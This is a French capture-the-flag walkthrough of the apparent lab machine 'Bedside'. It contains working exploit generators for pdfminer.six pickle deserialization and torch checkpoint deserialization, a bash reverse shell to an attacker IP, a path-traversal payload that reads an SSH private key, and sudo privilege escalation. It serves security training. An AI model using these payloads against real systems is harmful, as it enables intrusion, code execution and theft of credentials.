# Bedside

	echo "10.129.48.247 bedside.htb" >> /etc/hosts
	sudo masscan -p1-65535,U:1-65535 10.129.48.247 -e tun0 > ports.txt
	sudo nmap -p- -sV -T4 -A 10.129.48.247 -oN nmap.txt
	
Résultats :

    PORT      STATE    SERVICE        REASON      VERSION
    22/tcp   open     ssh     syn-ack ttl 62 OpenSSH 10.0p2 Debian 7+deb13u4 (protocol 2.0)
    80/tcp   open     http    syn-ack ttl 62 Apache httpd 2.4.68
    3000/tcp filtered ppp     no-response

Le fuzzing donne un vhost où l'on peut uploader : 

    ffuf -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -u http://bedside.htb -H "Host: FUZZ.bedside.htb" -fw 21

Header intéressant : 
> X-Powered-By: pdfminer.six

CVE de 2025 qui permet de l'exécution de code dessus : 

- https://github.com/pdfminer/pdfminer.six/security/advisories/GHSA-wf5f-4jwr-ppcp
- https://access.redhat.com/security/cve/cve-2025-64512

Script pour générer les fichiers : 

```
#!/usr/bin/env python3
import argparse
import gzip
import os
import pickle


def build_pickle(cmd: str, out_path: str) -> None:
    class EvilPayload:
        def __reduce__(self):
            code = f"__import__('os').system({cmd!r})"
            return (eval, (code,))

    with gzip.open(out_path, "wb") as f:
        pickle.dump(EvilPayload(), f)

    print(f"[+] Wrote {out_path}")
    print(f"[+] Command embedded: {cmd}")
    print(f"[+] Size: {os.path.getsize(out_path)} bytes")


def pdf_name_encode(path: str) -> str:
    out = []
    for ch in path:
        if ch == "/":
            out.append("#2F")
        elif ch.isalnum() or ch in "-_.":
            out.append(ch)
        else:
            out.append("#%02X" % ord(ch))
    return "".join(out)


def build_pdf(target: str, out_path: str) -> None:
    encoded_name = pdf_name_encode(target)
    print(f"[+] Target absolute pickle path: {target}.pickle.gz")
    print(f"[+] Encoded /Encoding name: /{encoded_name}")

    objects = []
    objects.append(b"<< /Type /Catalog /Pages 2 0 R >>")
    objects.append(b"<< /Type /Pages /Kids [3 0 R] /Count 1 >>")

    content_stream = b"BT /F1 12 Tf 10 100 Td (X) Tj ET"
    objects.append(
        b"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 200 200] "
        b"/Resources << /Font << /F1 5 0 R >> >> /Contents 4 0 R >>"
    )
    objects.append(
        b"<< /Length %d >>\nstream\n%s\nendstream" % (len(content_stream), content_stream)
    )
    objects.append(
        ("<< /Type /Font /Subtype /Type0 /BaseFont /MaliciousFont-Identity-H "
         f"/Encoding /{encoded_name} /DescendantFonts [6 0 R] >>").encode()
    )
    objects.append(
        b"<< /Type /Font /Subtype /CIDFontType2 /BaseFont /MaliciousFont-Identity-H "
        b"/CIDSystemInfo << /Registry (Adobe) /Ordering (Identity) /Supplement 0 >> "
        b"/FontDescriptor 7 0 R /DW 1000 >>"
    )
    objects.append(
        b"<< /Type /FontDescriptor /FontName /MaliciousFont-Identity-H /Flags 4 "
        b"/FontBBox [0 0 1000 1000] /ItalicAngle 0 /Ascent 1000 /Descent 0 "
        b"/CapHeight 1000 /StemV 80 >>"
    )

    buf = bytearray()
    buf += b"%PDF-1.7\n%\xe2\xe3\xcf\xd3\n"

    offsets = [0]
    for i, obj in enumerate(objects, start=1):
        offsets.append(len(buf))
        buf += f"{i} 0 obj\n".encode()
        buf += obj
        buf += b"\nendobj\n"

    xref_offset = len(buf)
    n = len(objects) + 1
    buf += f"xref\n0 {n}\n".encode()
    buf += b"0000000000 65535 f \n"
    for off in offsets[1:]:
        buf += f"{off:010d} 00000 n \n".encode()

    buf += b"trailer\n"
    buf += f"<< /Size {n} /Root 1 0 R >>\n".encode()
    buf += b"startxref\n"
    buf += f"{xref_offset}\n".encode()
    buf += b"%%EOF"

    with open(out_path, "wb") as f:
        f.write(bytes(buf))

    print(f"[+] Wrote {out_path} ({len(buf)} bytes)")


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--target", default="/tmp/evil")
    ap.add_argument("--cmd", default="id > /tmp/pwned_bedside 2>&1")
    ap.add_argument("--pickle-out", default=None)
    ap.add_argument("--pdf-out", default="malicious.pdf")
    args = ap.parse_args()

    pickle_out = args.pickle_out or (os.path.basename(args.target) + ".pickle.gz")

    build_pickle(args.cmd, pickle_out)
    print()
    build_pdf(args.target, args.pdf_out)
    print()
    print(f"[+] Plant '{pickle_out}' on the target at: {args.target}.pickle.gz")
    print(f"[+] Then upload/trigger processing of '{args.pdf_out}' to fire the RCE.")


if __name__ == "__main__":
    main()

```

Exploitation : 
    
    python3 poc.py --target /tmp/evil --cmd "bash -c 'bash -i >& /dev/tcp/10.10.17.89/9999 0>&1'"
    nc -nvlp 9999

    curl -F "uploadFile=@evil.pickle.gz;filename=../../../../tmp/evil.pickle.gz;type=application/gzip" http://research.bedside.htb/
    

Le traversal dans le nom de fichier est neutralisé côté serveur, le fichier atterrit tel quel dans /uploads/evil.pickle.gz, sans besoin de traversal puisque gz est whitelisté.

Le chemin disque absolu de uploads/ n'est pas connu à l'avance. On teste à coup de PDF avec callback réseau (curl http://IP:PORT/hitN) pour chaque hypothèse de chemin : 
- /var/www/research.bedside.htb/uploads/evil
- /var/www/research/uploads/evil
- /var/www/html/uploads/evil
- ...

On finit par avoir un shell en tant que datawrangler.

## Pivoting

Après réception du shell, on doit énumérer le conteneur parce qu'il n'y a ni "ss" ni "netstat" : 

```
python3 -c "import socket;socket.setdefaulttimeout(0.3);[print(p) for p in range(1,65536) if socket.socket(socket.AF_INET,socket.SOCK_STREAM).connect_ex(('127.0.0.1',p))==0]"
```

Fingerprinting du service qui tourne sur le port 3000 : 

    curl -sv http://localhost:3000

On voit un "[...] Built with esm.sh/x [...] en bas"

Un CVE existe aussi permettant une LFI et une lecture : 
- https://github.com/esm-dev/esm.sh/security/advisories/GHSA-49pv-gwxp-532r

```
PAYLOAD='..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f'
curl -s "http://127.0.0.1:3000/${PAYLOAD}etc/passwd"
curl -s "http://127.0.0.1:3000/${PAYLOAD}home/developer/user.txt"
curl -s "http://127.0.0.1:3000/${PAYLOAD}home/developer/.ssh/id_ed25519"
[...]
vim developer_key
chmod 600 developer_key
ssh -i developer_key developer@10.129.48.247
```

## Élévation de privilèges

    sudo -l
    
> (ALL) NOPASSWD: /usr/bin/python3 /opt/trainer/bedside_trainer.py
    
Ce script charge le checkpoint le plus récent de /datastore/checkpoints via MONAI, qui appelle torch.load(..., weights_only=False). Désérialisation pickle non restreinte, donc RCE si on contrôle le fichier .pt.

Trois points importants : 

- /datastore/checkpoints appartient à datawrangler:dataops en écriture et notre foothold datawrangler peut y déposer un fichier.
- /datastore est un bind mount partagé entre le conteneur et l'hôte, ce que datawrangler écrit, le script root le lit.
- Le loader n'est atteint qu'après que build_model() ait itéré le dataloader, donc il faut aussi une image valide dans /datastore/processed.

Script pour générer les fichiers du PoC : 

```
#!/usr/bin/env python3
import argparse
import pickle


def build_checkpoint(cmd: str, out_path: str) -> None:
    class EvilCheckpoint:
        def __reduce__(self):
            code = f"__import__('os').system({cmd!r})"
            return (eval, (code,))

    with open(out_path, "wb") as f:
        pickle.dump(EvilCheckpoint(), f)

    print(f"[+] Wrote {out_path}")
    print(f"[+] Command embedded: {cmd}")


def build_png(out_path: str, size: int = 64) -> None:
    from PIL import Image

    img = Image.new("RGB", (size, size), color=(120, 120, 120))
    img.save(out_path, format="PNG")
    print(f"[+] Wrote {out_path} ({size}x{size} PNG)")


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--cmd", required=True)
    ap.add_argument("--ckpt-out", default="checkpoint_epoch_999.pt")
    ap.add_argument("--png-out", default="scan.png")
    args = ap.parse_args()

    build_checkpoint(args.cmd, args.ckpt_out)
    build_png(args.png_out)


if __name__ == "__main__":
    main()
```

Exploitation : 

```
# En tant que datawrangler : 

rm -f /datastore/checkpoints/*.pt /datastore/processed/* 
cd /datastore/processed
curl http://10.10.17.89:8000/scan.png -o scan.png
cd /datastore/checkpoints
curl http://10.10.17.89:8000/checkpoint_epoch_999.pt -o checkpoint_epoch_999.pt

# En tant que developer : 

sudo /usr/bin/python3 /opt/trainer/bedside_trainer.py
cat /tmp/.rootflag
```
